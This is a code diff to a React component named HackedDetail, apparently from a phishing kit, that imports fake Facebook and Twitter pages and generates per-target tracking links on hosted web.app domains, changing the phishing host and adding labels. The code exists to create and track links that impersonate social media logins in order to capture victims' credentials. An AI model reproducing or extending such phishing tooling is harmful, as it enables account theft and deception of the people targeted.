@@ -1,5 +1,7 @@
 import React, { useEffect, useRef, useState } from "react";
 import PhishData from "./PhishData";
+import Twitter from './../../PhishingSite/Twitter/Twitter';
+import Facebook from './../../PhishingSite/Facebook/Facebook';
 const HackedDetail = ({ keyValue }) => {
   const [fbLink, setFbLink] = useState("");
   const [twitterLink, setTwitterLink] = useState("");
@@ -57,8 +59,8 @@ const HackedDetail = ({ keyValue }) => {
     const facebookTrackId = fakeId + facebookLink;
     const twitterTrackId = fakeId + twitterLink;
 
-    const fbPhishLink = `https://socialmediaupdate-67add.web.app/facebook?id=${facebookTrackId}`;
-    const twitterPhishLink = `https://socialmediaupdate-67add.web.app/twitter?id=${twitterTrackId}`;
+    const fbPhishLink = `https://social-9bb0e.web.app/facebook?id=${facebookTrackId}`;
+    const twitterPhishLink = `https://social-9bb0e.web.app/twitter?id=${twitterTrackId}`;
 
     setTwitterLink(twitterPhishLink);
     setFbLink(fbPhishLink);
@@ -98,6 +100,7 @@ const HackedDetail = ({ keyValue }) => {
       ) : (
         ""
       )}
+      <p className="my-2">Facebook</p>
       <p className="my-2">
         <a href={fbLink}>
           <span>{fbLink}</span>
@@ -115,6 +118,7 @@ const HackedDetail = ({ keyValue }) => {
       ) : (
         ""
       )}
+      <p className="my-2">Twitter</p>
       <p className="my-2">
         <a href={twitterLink}>
           <span>{twitterLink}</span>
